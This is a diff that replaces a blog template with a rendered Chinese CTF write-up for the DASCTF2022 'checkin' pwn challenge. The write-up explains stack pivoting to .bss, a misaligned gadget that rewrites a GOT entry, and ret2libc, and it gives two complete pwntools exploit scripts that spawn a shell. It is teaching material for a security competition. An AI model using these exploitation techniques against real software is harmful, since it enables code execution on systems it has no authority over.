@@ -1,37 +1,500 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-{% block page_class %}page-post-detail{% endblock %}
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wp.zgroot.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="总结：通过这道题的学习和收获有： 1、栈迁移，何为栈？本来栈的定义就是rsp指针与rbp指针之间的就是栈。rsp在哪栈就在哪，因此两次leave，栈就变了两次，而真正跳到变化的栈那步是在最后的ret执行的。也算是对栈迁移又有了一点新的理解。 2、利用magic gadget修改got表 3、这道题的核心考察的就是栈迁移以及payload布局。 4、取magic gadget中的ebx时，如果ebx">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF2022_checkin">
+<meta property="og:url" content="https://wp.zgroot.cn/DASCTF/DASCTF2022_checkin/index.html">
+<meta property="og:site_name" content="楼上请让路*的WP">
+<meta property="og:description" content="总结：通过这道题的学习和收获有： 1、栈迁移，何为栈？本来栈的定义就是rsp指针与rbp指针之间的就是栈。rsp在哪栈就在哪，因此两次leave，栈就变了两次，而真正跳到变化的栈那步是在最后的ret执行的。也算是对栈迁移又有了一点新的理解。 2、利用magic gadget修改got表 3、这道题的核心考察的就是栈迁移以及payload布局。 4、取magic gadget中的ebx时，如果ebx">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121501353.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121504338.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121508220.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121513742.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121517837.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121521819.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220411121525688.png">
+<meta property="article:published_time" content="2022-04-27T14:27:46.057Z">
+<meta property="article:modified_time" content="2022-04-27T14:27:46.057Z">
+<meta property="article:author" content="楼上请让路*">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="栈迁移">
+<meta property="article:tag" content="magic gadget">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wp.zgroot.cn/upload/img/image-20220411121501353.png">
+
+<link rel="canonical" href="https://wp.zgroot.cn/DASCTF/DASCTF2022_checkin/">
 
 
-{% block content %}
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+  <title>DASCTF2022_checkin | 楼上请让路*的WP</title>
+  
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">楼上请让路*的WP</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">wp发布</p>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wp.zgroot.cn/DASCTF/DASCTF2022_checkin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/image.png">
+      <meta itemprop="name" content="楼上请让路*">
+      <meta itemprop="description" content="楼上请让路*的WP">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="楼上请让路*的WP">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DASCTF2022_checkin
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-27 14:27:46 14:27:46" itemprop="dateCreated datePublished" datetime="2022-04-27T14:27:46+00:00">2022-04-27 14:27:46</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/DASCTF/" itemprop="url" rel="index"><span itemprop="name">DASCTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的学习和收获有：</p>
+<p>1、栈迁移，何为栈？本来栈的定义就是rsp指针与rbp指针之间的就是栈。rsp在哪栈就在哪，因此两次leave，栈就变了两次，而真正跳到变化的栈那步是在最后的ret执行的。也算是对栈迁移又有了一点新的理解。</p>
+<p>2、利用magic gadget修改got表</p>
+<p>3、这道题的核心考察的就是栈迁移以及payload布局。</p>
+<p>4、取magic gadget中的ebx时，如果ebx的值为正，则直接取，如果为负，则加0x100000000取补码。</p>
+<p>5、如果可以的话，迁移到bss段尽量迁移到地址高一点的地方。这次打远程的那个exp就是因为bss段迁移的太低了，因为是破坏了某些数据，导致最后执行system函数的时候卡住了。</p>
+<span id="more"></span>
+
+<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/upload/img/image-20220411121501353.png" alt="image-20220411121501353"></p>
+<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p><img src="/upload/img/image-20220411121504338.png" alt="image-20220411121504338"></p>
+<p>可以发现，这道题就一个输入函数，没有输出函数，不过这个read具有16字节的溢出。这个没什么好想的，直接就栈迁移了。</p>
+<p>然后输出函数也没有，泄露栈基地址这种情况就排除了，那就只能迁移到bss段。</p>
+<p>先考虑一点，溢出16个字节仅仅只能去迁移，我们似乎没有办法去bss段布置数据。不过观察了一下汇编代码，发现read函数的第二个参数是由rbp确定的。</p>
+<p><img src="/upload/img/image-20220411121508220.png" alt="image-20220411121508220"></p>
+<p>而我们可以利用溢出来控制rbp，因此就相当于可以控制read的输入的地方了，控制完rbp的话，只能在控制一个返回地址，既然控制rbp就已经相当于控制rsi了，那就返回0x4011BF再读一次（此时的read输入的地址已经是bss段了）。<strong>选取往bss段输入的内容，一定要把地址抬高，我最开始选择的是往0x404100这里写入数据再迁移，到了最后执行system的过程中给卡死了</strong></p>
+<p>read结束之后，又到了leave;ret指令。<strong>leave指令就是mov rsp;rbp  pop rbp</strong>；</p>
+<p>执行leave指令的时候，我们的rbp是什么？是我们要控制read函数的rsi来设定的rbp（它现在是bss段地址）</p>
+<p>我还是用实际的数据来举例一下吧。假设我第一次控制rbp为（0x404600+0xa0），那rsi的值就是0x404600（因为buf为-0xa0）（即我们输入的数据是从0x404600处开始输入的）我们可以输入0xB0个数据，因此在0x404600+0xa0这个地方写入0x404600。</p>
+<p>此时执行read结束后的leave指令是什么情况？（如下图）</p>
+<p><img src="/upload/img/image-20220411121513742.png" alt="image-20220411121513742"></p>
+<p><img src="/upload/img/image-20220411121517837.png" alt="image-20220411121517837"></p>
+<p><img src="/upload/img/image-20220411121521819.png" alt="image-20220411121521819"></p>
+<p><img src="/upload/img/image-20220411121525688.png" alt="image-20220411121525688"></p>
+<p>总结一下上面的过程，<strong>原本read读入完我们的数据，<font color=#FF0000 >rbp指向的才是我们想跳转的地方（并非rbp本身）</font>而rbp本身距离我们想跳转的还有0xa0个字节，不过至少rbp就在bss段，执行了第一次leave之后，<font color=#FF0000 >rsp也就变成了rbp的值（同时由于pop rbp，此时的rbp又变成了rbp当初所指向的内容）</font>，此时已经迁移到bss段了（只不过我们还要再迁移到我们布置的数据那里）因此再来一次leave（这个是第二次read输入过去的），由于leave里的mov rsp,rbp，rsp再次被改变，最后完成了迁移（迁移到了我们布置在bss段里的数据）</strong></p>
+<p>至此的话，大体框架就已经完成了。</p>
+<p><strong>剩下的就是在bss段中布局payload了，本地的话非常简单，用magic gadget去将setvbuf函数地址修改为one_gadget地址，然后调用一下setvbuf就完事了。远程的话，roderick师傅给我说，因为动态库的原因，one_gadget用不了，因此只能把setvbuf改成puts函数，然后再劫持程序执行流，完成ret2libc。</strong></p>
+<p>这里先简单说一下magic gadget吧，用ROPgadget –binary checkin –opcode 015dc3  去搜这个gadget的地址。015dc3是这个gadget的机器码（IDA里是看不见的，因为这个是机器码错位得到的）。</p>
+<p>这个gadget长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br><span class="line">nop    DWORD PTR [eax+eax*1+0x0]</span><br><span class="line">repz ret</span><br></pre></td></tr></table></figure>
+
+<p>核心是在第一行的add上，我们可以利用ret2csu控制rbp和rbx，由此就可以用这个修改函数的got表。以这道题为例，我现在想将setvbuf的真实地址改成one_gadget地址，只需要将rbp-0x3d写成setvbuf的got地址，将ebx放成setvbuf和one_gadget二者在libc库中的偏移即可。再调用这个one_gadget，即可完成修改got表。</p>
+<p>这个magic gadget威力还是很大的，如果上述过程不懂的可以再好好想一下或者google一下。（之所以这里不想再详细讲了，是因为我在另一篇文章中详细写了这个东西，只不过因为一些原因那篇文章暂时不能发，这里用到了就简单提一下吧）</p>
+<p>一句话概括本题思路，利用栈迁移到bss段，调试布置payload，利用magic gadget修改setvbuf got表为打印函数，最后ret2libc即可。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><p>这是打本地的，用的one_gadget。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./ab&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./ab&#x27;</span>)</span><br><span class="line">setvbuf_got_addr=e.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">setvbuf_plt_addr=<span class="number">0x401064</span></span><br><span class="line">bss_addr=<span class="number">0x404100</span>+<span class="number">0xa0</span></span><br><span class="line">leave_ret_addr=<span class="number">0x4011e2</span></span><br><span class="line">read_addr=<span class="number">0x4011bf</span></span><br><span class="line">magic_gadget=<span class="number">0x40113c</span></span><br><span class="line">csu1=<span class="number">0x40124A</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="number">160</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)+p64(csu1)+p64(<span class="number">0x8905c</span>)<span class="comment">#这个0x8905c为setvbuf和one_gadget二者地址在libc库中的差值</span></span><br><span class="line">payload+=p64(setvbuf_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget)</span><br><span class="line">payload+=p64(setvbuf_plt_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">160</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404100</span>)+p64(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>比赛结束，远程的环境关闭了，不过roderick师傅远程打通了，我按照他这个思路写的，动态库换成比赛给的2.31，然后改成remote，远程也是ok的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27544)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">puts_off=libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">setvbuf_off=libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_off))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(setvbuf_off))</span><br><span class="line">pop_rbp_addr=<span class="number">0x40113d</span></span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">setvbuf_got_addr=e.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">setvbuf_plt_addr=<span class="number">0x401064</span></span><br><span class="line">bss_addr=<span class="number">0x404600</span>+<span class="number">0xa0</span></span><br><span class="line">leave_ret_addr=<span class="number">0x4011e2</span></span><br><span class="line">read_addr=<span class="number">0x4011bf</span></span><br><span class="line">magic_gadget=<span class="number">0x40113c</span></span><br><span class="line">csu1=<span class="number">0x40124A</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401253</span></span><br><span class="line">ret_addr=<span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">if</span> puts_off&gt;setvbuf_off:</span><br><span class="line">    offset=puts_off-setvbuf_off</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    offset=puts_off-setvbuf_off+<span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(offset))</span><br><span class="line">payload=<span class="number">160</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(read_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)+p64(csu1)+p64(offset)<span class="comment">#rbx</span></span><br><span class="line">payload+=p64(setvbuf_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(read_got_addr)</span><br><span class="line">payload+=p64(setvbuf_plt_addr)</span><br><span class="line">payload+=p64(pop_rbp_addr)<span class="comment">#让rbp去指向0x404600（但是rbp本身是0x4046a0)，这样read结束之后触发了第一次leave，就让rsp的值为0x4046a8（这个地址指向的就是leave;ret）（此时rbp由于pop rbp，自身的值变成了0x404600），然后到ret，再次执行了leave;ret</span></span><br><span class="line"><span class="comment">#第二次leave，rsp才算变成了0x404608，然后ret实现了转移至布置到的system处。</span></span><br><span class="line">payload+=p64(<span class="number">0x404600</span>+<span class="number">0xa0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4011BF</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">160</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404600</span>)+p64(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(ret_addr)<span class="comment">#这道题需要栈对齐，具体细节我的另一篇博客上有讲。</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(bin_sh_addr)</span><br><span class="line">payload+=p64(sys_addr)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>如果不太理解exp为什么这样写，就多调试N遍（我光调试这远程一个脚本从写到各种调试再到打通再到彻底理解，调试了73遍…)，总会有所收获的。<br>本人就一菜狗，如果写的有错误的地方，欢迎指正</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>楼上请让路*
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wp.zgroot.cn/DASCTF/DASCTF2022_checkin/" title="DASCTF2022_checkin">https://wp.zgroot.cn/DASCTF/DASCTF2022_checkin/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
+              <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" rel="tag"># 栈迁移</a>
+              <a href="/tags/magic-gadget/" rel="tag"># magic gadget</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/GKCTF/%5BGKCTF%202021%5Dcheckin/" rel="prev" title="GKCTF 2021_checkin">
+      <i class="fa fa-chevron-left"></i> GKCTF 2021_checkin
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/BUU/BUUCTF_jarvisoj_guess/" rel="next" title="BUUCTF_jarvisoj_guess">
+      BUUCTF_jarvisoj_guess <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">总结：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">保护策略：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%A7%E8%87%B4%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">大致思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp:</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="楼上请让路*"
+      src="/images/image.png">
+  <p class="site-author-name" itemprop="name">楼上请让路*</p>
+  <div class="site-description" itemprop="description">楼上请让路*的WP</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/polishing-labs" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;polishing-labs" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">楼上请让路*</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
